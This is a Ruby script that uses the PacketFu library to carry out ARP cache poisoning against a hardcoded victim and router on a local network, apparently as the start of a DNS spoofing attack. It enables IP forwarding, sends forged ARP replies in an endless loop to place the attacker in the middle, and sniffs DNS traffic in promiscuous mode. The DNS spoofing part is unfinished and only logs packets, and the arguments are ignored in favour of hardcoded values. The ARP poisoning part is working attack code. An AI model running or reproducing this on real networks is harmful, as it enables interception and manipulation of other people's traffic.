#!/usr/bin/ruby
require 'rubygems'
require 'packetfu'
require 'thread'

def initArpPackets(intface, victimIP)
	@interface = intface
	@victimIP = victimIP
	@routerIP = "192.168.0.100"
	@srcMAC = "78:2b:cb:a3:43:25" #	PacketFu::Utils.whoami?(:iface => @interface)
	puts "mac addresses"
	@victimMAC = "78:2b:cb:a3:eb:af" #PacketFu::Utils.arp(@victimIP, :iface => @interface)
	@routerMAC = "00:1a:6d:38:15:ff" #PacketFu::Utils.arp(@routerIP, :iface => @interface)

		puts "Constructing arp packets"

	#Construct the target's packet
	arp_packet_target = PacketFu::ARPPacket.new()
	arp_packet_target.eth_saddr = @srcMAC#[:eth_saddr]       # sender's MAC address
	arp_packet_target.eth_daddr = @victimMAC#[:eth_saddr]       		# target's MAC address
	arp_packet_target.arp_saddr_mac = @srcMAC#[:eth_saddr]   #'78:2b:cb:a3:6b:62'   # sender's MAC address
	arp_packet_target.arp_daddr_mac = @victimMAC#[:eth_saddr]  #'78:2b:cb:a3:ef:c9'   # target's MAC address
	arp_packet_target.arp_saddr_ip = @routerIP #'192.168.0.100'        # router's IP
	arp_packet_target.arp_daddr_ip = @victimIP # '192.168.0.13'         # target's IP
	arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP reply
	 
	# Construct the router's packet
	arp_packet_router = PacketFu::ARPPacket.new()
	arp_packet_router.eth_saddr = @srcMAC#[:eth_saddr]       # sender's MAC address
	arp_packet_router.eth_daddr = @routerMAC#[:eth_saddr] #'00:1a:6d:38:15:ff'       # router's MAC address
	arp_packet_router.arp_saddr_mac = @srcMAC#[:eth_saddr]   # sender's MAC address
	arp_packet_router.arp_daddr_mac = @routerMAC#[:eth_saddr]   #'00:1a:6d:38:15:ff'   # router's MAC address
	arp_packet_router.arp_saddr_ip = @victimIP         	# target's IP
	arp_packet_router.arp_daddr_ip = @routerIP        	# router's IP
	arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
	
	puts "begin sending arp packets"
	caught=false
	while caught==false do
	sleep 1
	arp_packet_target.to_w(@interface)
	arp_packet_router.to_w(@interface)
	end
end

def revertArpPackets(intface, victimIP)
	@interface = intface
	@victimIP = victimIP
	@routerIP = "192.168.0.100"
	@srcMAC = "78:2b:cb:a3:43:25" #	PacketFu::Utils.whoami?(:iface => @interface)

	@victimMAC = "78:2b:cb:a3:eb:af" #PacketFu::Utils.arp(@victimIP, :iface => @interface)
	@routerMAC = "00:1a:6d:38:15:ff" #PacketFu::Utils.arp(@routerIP, :iface => @interface)

	#Construct the target's packet
	arp_packet_target = PacketFu::ARPPacket.new()
	arp_packet_target.eth_saddr = @routerMAC#[:eth_saddr]       # sender's MAC address
	arp_packet_target.eth_daddr = @victimMAC#[:eth_saddr]       		# target's MAC address
	arp_packet_target.arp_saddr_mac = @routerMAC#[:eth_saddr]   #'78:2b:cb:a3:6b:62'   # sender's MAC address
	arp_packet_target.arp_daddr_mac = @victimMAC#[:eth_saddr]  #'78:2b:cb:a3:ef:c9'   # target's MAC address
	arp_packet_target.arp_saddr_ip = @routerIP #'192.168.0.100'        # router's IP
	arp_packet_target.arp_daddr_ip = @victimIP # '192.168.0.13'         # target's IP
	arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP reply
	 
	# Construct the router's packet
	arp_packet_router = PacketFu::ARPPacket.new()
	arp_packet_router.eth_saddr = @victimMAC#[:eth_saddr]       # sender's MAC address
	arp_packet_router.eth_daddr = @routerMAC#[:eth_saddr] #'00:1a:6d:38:15:ff'       # router's MAC address
	arp_packet_router.arp_saddr_mac = @victimMAC#[:eth_saddr]   # sender's MAC address
	arp_packet_router.arp_daddr_mac = @routerMAC#[:eth_saddr]   #'00:1a:6d:38:15:ff'   # router's MAC address
	arp_packet_router.arp_saddr_ip = @victimIP         	# target's IP
	arp_packet_router.arp_daddr_ip = @routerIP        	# router's IP
	arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
	
	
	arp_packet_target.to_w(@interface)
	arp_packet_router.to_w(@interface)
	
end

def initDns(intface, victimIP)
	iface = intface
	capture_session = PacketFu::Capture.new(:iface => iface, :start => true, :promisc => true,
	:filter => "udp and port 53" ) #'udp[10] & 128 = 0' and and  src = " + victimIP

	capture_session.stream.each do |packet|
		if UDPPacket.can_parse?(packet)
			puts "dns packet found!" 
			pkt = Packet.parse packet
			packet_info = [pkt.ip_saddr, pkt.ip_daddr]
			src_ip = "%s" % packet_info
			dst_ip = "%s" % packet_info
			#puts_verbose(packet, src_ip, dst_ip)
		end
	end

end


begin
	unless (ARGV.size == 2)
		puts "Usage: ruby #{$0} [Interface] [Victim IP]"
		puts "Example: ruby #{$0} em1 192.168.0.2"
		exit
	end
	# Enable IP forwarding
	`echo 1 > /proc/sys/net/ipv4/ip_forward`


	puts "Starting the ARP poisoning thread..."
	spoof_thread = Thread.new{initArpPackets("em1","192.168.0.1")} 
	dns_thread = Thread.new{initDns("em1","192.168.0.1")} 
	spoof_thread.join
	dns_thread.join


	 # Catch the interrupt and kill the threads
	rescue Interrupt
	puts "\nDNS spoof stopped by interrupt signal."
	Thread.kill(spoof_thread)
		
	revertArpPackets("em1","192.168.0.1")
	Thread.kill(dns_thread)
	`echo 0 > /proc/sys/net/ipv4/ip_forward`
	exit 0

end



